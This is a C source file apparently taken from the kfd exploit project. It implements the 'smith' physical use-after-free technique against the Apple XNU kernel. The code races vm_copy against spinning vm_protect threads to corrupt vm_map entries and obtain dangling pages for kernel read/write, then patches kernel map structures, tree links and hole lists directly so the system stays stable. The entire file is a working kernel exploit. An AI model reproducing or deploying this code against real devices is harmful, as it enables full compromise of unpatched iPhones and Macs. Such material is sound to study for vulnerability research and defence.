/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

const bool take_vm_map_lock = true;
void smith_helper_init(struct kfd* kfd);
void* smith_helper_spinner_pthread(void* arg);
void* smith_helper_cleanup_pthread(void* arg);
void smith_helper_cleanup(struct kfd* kfd);

struct smith_data {
    atomic_bool main_thread_returned;
    atomic_int started_spinner_pthreads;
    struct {
        vm_address_t address;
        vm_size_t size;
    } vme[5];
    struct {
        pthread_t pthread;
        atomic_bool should_start;
        atomic_bool did_start;
        atomic_uintptr_t kaddr;
        atomic_uintptr_t right;
        atomic_uintptr_t max_address;
    } cleanup_vme;
};


void smith_init(struct kfd* kfd) {
    kfd->puaf.puaf_method_data_size = sizeof(struct smith_data);
    kfd->puaf.puaf_method_data = malloc_bzero(kfd->puaf.puaf_method_data_size);
    smith_helper_init(kfd);
}

void smith_run(struct kfd* kfd) {
    struct smith_data* smith = (struct smith_data*)(kfd->puaf.puaf_method_data);
    assert_mach(vm_allocate(mach_task_self(), &smith->vme[2].address, smith->vme[2].size, VM_FLAGS_FIXED));
    assert_mach(vm_allocate(mach_task_self(), &smith->vme[1].address, smith->vme[1].size, VM_FLAGS_FIXED));
    assert_mach(vm_allocate(mach_task_self(), &smith->vme[0].address, smith->vme[0].size, VM_FLAGS_FIXED));
    assert_mach(vm_allocate(mach_task_self(), &smith->vme[3].address, smith->vme[3].size, VM_FLAGS_FIXED | VM_FLAGS_PURGABLE));
    assert_mach(vm_allocate(mach_task_self(), &smith->vme[4].address, smith->vme[4].size, VM_FLAGS_FIXED | VM_FLAGS_PURGABLE));
    const u64 number_of_spinner_pthreads = 4;
    pthread_t spinner_pthreads[number_of_spinner_pthreads] = {};
    for (u64 i = 0; i < number_of_spinner_pthreads; i++) {
        assert_bsd(pthread_create(&spinner_pthreads[i], NULL, smith_helper_spinner_pthread, kfd));
    }
    while (atomic_load(&smith->started_spinner_pthreads) != number_of_spinner_pthreads) {
        usleep(10);
    }
    assert(vm_copy(mach_task_self(), smith->vme[2].address, (0ull - smith->vme[2].address - 1), 0) == KERN_PROTECTION_FAILURE);
    atomic_store(&smith->main_thread_returned, true);
    for (u64 i = 0; i < number_of_spinner_pthreads; i++) {
        assert_bsd(pthread_join(spinner_pthreads[i], NULL));
    }
    assert_mach(vm_copy(mach_task_self(), smith->vme[3].address, smith->vme[3].size, smith->vme[1].address));
    memset((void*)(smith->vme[1].address), 'A', smith->vme[1].size);
    assert_mach(vm_protect(mach_task_self(), smith->vme[1].address, smith->vme[3].size, false, VM_PROT_DEFAULT));
    assert_mach(vm_copy(mach_task_self(), smith->vme[4].address, smith->vme[4].size, smith->vme[0].address));
    for (u64 i = 0; i < kfd->puaf.number_of_puaf_pages; i++) {
        kfd->puaf.puaf_pages_uaddr[i] = smith->vme[1].address + pages(i);
    }
}

void smith_cleanup(struct kfd* kfd) {
    smith_helper_cleanup(kfd);
    struct smith_data* smith = (struct smith_data*)(kfd->puaf.puaf_method_data);
    u64 kread_page_uaddr = trunc_page(kfd->kread.krkw_object_uaddr);
    u64 kwrite_page_uaddr = trunc_page(kfd->kwrite.krkw_object_uaddr);
    u64 min_puaf_page_uaddr = min(kread_page_uaddr, kwrite_page_uaddr);
    u64 max_puaf_page_uaddr = max(kread_page_uaddr, kwrite_page_uaddr);
    vm_address_t address1 = smith->vme[0].address;
    vm_size_t size1 = smith->vme[0].size + (min_puaf_page_uaddr - smith->vme[1].address);
    assert_mach(vm_deallocate(mach_task_self(), address1, size1));
    vm_address_t address2 = max_puaf_page_uaddr + pages(1);
    vm_size_t size2 = (smith->vme[2].address - address2) + smith->vme[2].size + smith->vme[3].size + smith->vme[4].size;
    assert_mach(vm_deallocate(mach_task_self(), address2, size2));
    if ((max_puaf_page_uaddr - min_puaf_page_uaddr) > pages(1)) {
        vm_address_t address3 = min_puaf_page_uaddr + pages(1);
        vm_size_t size3 = (max_puaf_page_uaddr - address3);
        assert_mach(vm_deallocate(mach_task_self(), address3, size3));
    }
}

void smith_free(struct kfd* kfd) {
    u64 kread_page_uaddr = trunc_page(kfd->kread.krkw_object_uaddr);
    u64 kwrite_page_uaddr = trunc_page(kfd->kwrite.krkw_object_uaddr);
    assert_mach(vm_deallocate(mach_task_self(), kread_page_uaddr, pages(1)));
    if (kwrite_page_uaddr != kread_page_uaddr) {
        assert_mach(vm_deallocate(mach_task_self(), kwrite_page_uaddr, pages(1)));
    }
}

void smith_helper_init(struct kfd* kfd) {
    const u64 target_hole_size = pages(0);
    bool found_target_hole = false;
    struct smith_data* smith = (struct smith_data*)(kfd->puaf.puaf_method_data);
    smith->vme[0].size = pages(1);
    smith->vme[1].size = pages(kfd->puaf.number_of_puaf_pages);
    smith->vme[2].size = pages(1);
    smith->vme[3].size = (smith->vme[1].size + smith->vme[2].size);
    smith->vme[4].size = (smith->vme[0].size + smith->vme[3].size);
    u64 smith_total_size = (smith->vme[3].size + smith->vme[4].size + smith->vme[4].size);
    u64 min_address, max_address;
    puaf_helper_get_vm_map_min_and_max(&min_address, &max_address);
    if (take_vm_map_lock) {
        atomic_store(&smith->cleanup_vme.max_address, max_address);
        assert_bsd(pthread_create(&smith->cleanup_vme.pthread, NULL, smith_helper_cleanup_pthread, kfd));
    }
    vm_address_t address = 0;
    vm_size_t size = 0;
    vm_region_basic_info_data_64_t data = {};
    vm_region_info_t info = (vm_region_info_t)(&data);
    mach_msg_type_number_t count = VM_REGION_BASIC_INFO_COUNT_64;
    mach_port_t port = MACH_PORT_NULL;
    vm_address_t vme0_address = 0;
    vm_address_t prev_vme_end = 0;
    while (true) {
        kern_return_t kret = vm_region_64(mach_task_self(), &address, &size, VM_REGION_BASIC_INFO_64, info, &count, &port);
        if ((kret == KERN_INVALID_ADDRESS) || (address >= max_address)) {
            if (found_target_hole) {
                vm_size_t last_hole_size = max_address - prev_vme_end;
                if (last_hole_size >= (smith_total_size + pages(1))) {
                    vme0_address = (max_address - smith_total_size);
                }
            }
            break;
        }
        assert(kret == KERN_SUCCESS);
        if (data.protection & VM_PROT_EXECUTE) {
            for (u64 page_address = address; page_address < address + size; page_address += pages(1)) {
                u64 tmp_value = *(volatile u64*)(page_address);
            }
        }
        vm_address_t hole_address = prev_vme_end;
        vm_size_t hole_size = address - prev_vme_end;
        if (prev_vme_end < min_address) {
            goto next_vm_region;
        }
        if (found_target_hole) {
            if (hole_size >= (smith_total_size + pages(1))) {
                vme0_address = (address - smith_total_size);
            }
        } else {
            if (hole_size >= target_hole_size) {
                found_target_hole = true;
            } else if (hole_size > 0) {
                assert_mach(vm_allocate(mach_task_self(), &hole_address, hole_size, VM_FLAGS_FIXED));
            }
        }
    next_vm_region:
        address += size;
        size = 0;
        prev_vme_end = address;
    }
    assert(found_target_hole);
    smith->vme[0].address = vme0_address;
    smith->vme[1].address = smith->vme[0].address + smith->vme[0].size;
    smith->vme[2].address = smith->vme[1].address + smith->vme[1].size;
    smith->vme[3].address = smith->vme[2].address + smith->vme[2].size;
    smith->vme[4].address = smith->vme[3].address + smith->vme[3].size;
}

void* smith_helper_spinner_pthread(void* arg) {
    struct kfd* kfd = (struct kfd*)(arg);
    struct smith_data* smith = (struct smith_data*)(kfd->puaf.puaf_method_data);
    atomic_fetch_add(&smith->started_spinner_pthreads, 1);
    while (!atomic_load(&smith->main_thread_returned)) {
        kern_return_t kret = vm_protect(mach_task_self(), 0, pages(1), false, VM_PROT_WRITE);
        assert((kret == KERN_SUCCESS) || (kret == KERN_INVALID_ADDRESS));
    }
    return NULL;
}

void* smith_helper_cleanup_pthread(void* arg) {
    struct kfd* kfd = (struct kfd*)(arg);
    struct smith_data* smith = (struct smith_data*)(kfd->puaf.puaf_method_data);
    vm_address_t max_address = atomic_load(&smith->cleanup_vme.max_address);
    vm_address_t cleanup_vme_end = 0;
    while (!atomic_load(&smith->cleanup_vme.should_start)) {
        usleep(1000);
    }
    do {
        u64 map_kaddr = kfd->info.kaddr.current_map;
        u64 entry_kaddr = kget_u64(_vm_map__hdr__links__prev, map_kaddr);
        while (true) {
            u64 entry_prev = kget_u64(vm_map_entry__links__prev, entry_kaddr);
            u64 entry_start = kget_u64(vm_map_entry__links__start, entry_kaddr);
            u64 entry_end = kget_u64(vm_map_entry__links__end, entry_kaddr);
            u64 entry_right = kget_u64(vm_map_entry__store__entry__rbe_right, entry_kaddr);
            if ((entry_end < max_address) && (entry_right != 0) && (entry_start != 0)) {
                atomic_store(&smith->cleanup_vme.kaddr, entry_kaddr);
                atomic_store(&smith->cleanup_vme.right, entry_right);
                u64 store_kaddr = entry_kaddr + kfd_offset(vm_map_entry__store__entry__rbe_left);
                kset_u64(vm_map_entry__store__entry__rbe_right, store_kaddr, entry_kaddr);
                cleanup_vme_end = entry_end;
                break;
            }
            entry_kaddr = entry_prev;
        }
    } while (0);
    atomic_store(&smith->cleanup_vme.did_start, true);
    vm_protect(mach_task_self(), cleanup_vme_end, pages(1), false, VM_PROT_ALL);
    return NULL;
}

#define vme_for_store(kaddr) ((kaddr) ? (((kaddr) - kfd_offset(vm_map_entry__store__entry__rbe_left)) & (~1ull)) : (kaddr))

void smith_helper_cleanup(struct kfd* kfd) {
    assert(kfd->info.kaddr.current_map);
    struct smith_data* smith = (struct smith_data*)(kfd->puaf.puaf_method_data);
    if (take_vm_map_lock) {
        atomic_store(&smith->cleanup_vme.should_start, true);
        while (!atomic_load(&smith->cleanup_vme.did_start)) {
            usleep(10);
        }
        usleep(100);
    }
    u64 map_kaddr = kfd->info.kaddr.current_map;
    do {
        u64 entry_count = 0;
        u64 entry_kaddr = kget_u64(_vm_map__hdr__links__next, map_kaddr);
        u64 map_entry_kaddr = map_kaddr + kfd_offset(_vm_map__hdr__links__prev);
        u64 first_vme_kaddr = 0;
        u64 first_vme_parent_store = 0;
        u64 second_vme_kaddr = 0;
        u64 second_vme_left_store = 0;
        u64 vme_end0_kaddr = 0;
        u64 vme_end0_start = 0;
        u64 leaked_entry_right_store = 0;
        u64 leaked_entry_parent_store = 0;
        u64 leaked_entry_prev = 0;
        u64 leaked_entry_next = 0;
        u64 leaked_entry_end = 0;
        while (entry_kaddr != map_entry_kaddr) {
            entry_count++;
            u64 entry_next = kget_u64(vm_map_entry__links__next, entry_kaddr);
            u64 entry_start = kget_u64(vm_map_entry__links__start, entry_kaddr);
            u64 entry_end = kget_u64(vm_map_entry__links__end, entry_kaddr);
            if (entry_count == 1) {
                first_vme_kaddr = entry_kaddr;
                first_vme_parent_store = kget_u64(vm_map_entry__store__entry__rbe_parent, entry_kaddr);
                u64 first_vme_left_store = kget_u64(vm_map_entry__store__entry__rbe_left, entry_kaddr);
                u64 first_vme_right_store = kget_u64(vm_map_entry__store__entry__rbe_right, entry_kaddr);
                assert(first_vme_left_store == 0);
                assert(first_vme_right_store == 0);
            } else if (entry_count == 2) {
                second_vme_kaddr = entry_kaddr;
                second_vme_left_store = kget_u64(vm_map_entry__store__entry__rbe_left, entry_kaddr);
            } else if (entry_end == 0) {
                vme_end0_kaddr = entry_kaddr;
                vme_end0_start = entry_start;
                assert(vme_end0_start == smith->vme[1].address);
            } else if (entry_start == 0) {
                assert(entry_kaddr == vme_for_store(first_vme_parent_store));
                assert(entry_kaddr == vme_for_store(second_vme_left_store));
                u64 leaked_entry_left_store = kget_u64(vm_map_entry__store__entry__rbe_left, entry_kaddr);
                leaked_entry_right_store = kget_u64(vm_map_entry__store__entry__rbe_right, entry_kaddr);
                leaked_entry_parent_store = kget_u64(vm_map_entry__store__entry__rbe_parent, entry_kaddr);
                assert(leaked_entry_left_store == 0);
                assert(vme_for_store(leaked_entry_right_store) == first_vme_kaddr);
                assert(vme_for_store(leaked_entry_parent_store) == second_vme_kaddr);
                leaked_entry_prev = kget_u64(vm_map_entry__links__prev, entry_kaddr);
                leaked_entry_next = entry_next;
                leaked_entry_end = entry_end;
                assert(leaked_entry_end == smith->vme[3].address);
            }
            entry_kaddr = entry_next;
        }
        kset_u64(vm_map_entry__links__next, leaked_entry_next, leaked_entry_prev);
        kset_u64(vm_map_entry__links__prev, leaked_entry_prev, leaked_entry_next);
        u64 vme_end0_start_and_next[2] = { vme_end0_start, (-1) };
        u64 unaligned_kaddr = vme_end0_kaddr + kfd_offset(vm_map_entry__links__start) + 1;
        u64 unaligned_uaddr = (u64)(&vme_end0_start_and_next) + 1;
        kwrite((u64)(kfd), (void*)(unaligned_uaddr), unaligned_kaddr, sizeof(u64));
        kset_u64(vm_map_entry__links__end, leaked_entry_end, vme_end0_kaddr);
        kset_u64(vm_map_entry__store__entry__rbe_parent, leaked_entry_parent_store, vme_for_store(leaked_entry_right_store));
        kset_u64(vm_map_entry__store__entry__rbe_left, leaked_entry_right_store, vme_for_store(leaked_entry_parent_store));
        u64 nentries_buffer = kget_u64(_vm_map__hdr__nentries, map_kaddr);
        i32 old_nentries = *(i32*)(&nentries_buffer);
        *(i32*)(&nentries_buffer) = (old_nentries - 1);
        kset_u64(_vm_map__hdr__nentries, nentries_buffer, map_kaddr);
        kset_u64(_vm_map__hint, map_entry_kaddr, map_kaddr);
    } while (0);
    do {
        u64 hole_count = 0;
        u64 hole_kaddr = kget_u64(_vm_map__holes_list, map_kaddr);
        u64 first_hole_kaddr = hole_kaddr;
        u64 prev_hole_end = 0;
        u64 first_leaked_hole_prev = 0;
        u64 first_leaked_hole_next = 0;
        u64 first_leaked_hole_end = 0;
        u64 second_leaked_hole_prev = 0;
        u64 second_leaked_hole_next = 0;
        while (true) {
            hole_count++;
            u64 hole_next = kget_u64(vm_map_entry__links__next, hole_kaddr);
            u64 hole_start = kget_u64(vm_map_entry__links__start, hole_kaddr);
            u64 hole_end = kget_u64(vm_map_entry__links__end, hole_kaddr);
            if (hole_start == 0) {
                first_leaked_hole_prev = kget_u64(vm_map_entry__links__prev, hole_kaddr);
                first_leaked_hole_next = hole_next;
                first_leaked_hole_end = hole_end;
                assert(prev_hole_end == smith->vme[1].address);
            } else if (hole_start == smith->vme[1].address) {
                second_leaked_hole_prev = kget_u64(vm_map_entry__links__prev, hole_kaddr);
                second_leaked_hole_next = hole_next;
                assert(hole_end == smith->vme[2].address);
            }
            hole_kaddr = hole_next;
            prev_hole_end = hole_end;
            if (hole_kaddr == first_hole_kaddr) {
                break;
            }
        }
        kset_u64(vm_map_entry__links__end, first_leaked_hole_end, first_leaked_hole_prev);
        kset_u64(vm_map_entry__links__next, first_leaked_hole_next, first_leaked_hole_prev);
        kset_u64(vm_map_entry__links__prev, first_leaked_hole_prev, first_leaked_hole_next);
        kset_u64(vm_map_entry__links__next, second_leaked_hole_next, second_leaked_hole_prev);
        kset_u64(vm_map_entry__links__prev, second_leaked_hole_prev, second_leaked_hole_next);
        kset_u64(_vm_map__hole_hint, first_hole_kaddr, map_kaddr);
    } while (0);
    if (take_vm_map_lock) {
        u64 entry_kaddr = atomic_load(&smith->cleanup_vme.kaddr);
        u64 entry_right = atomic_load(&smith->cleanup_vme.right);
        kset_u64(vm_map_entry__store__entry__rbe_right, entry_right, entry_kaddr);
        assert_bsd(pthread_join(smith->cleanup_vme.pthread, NULL));
    }
}
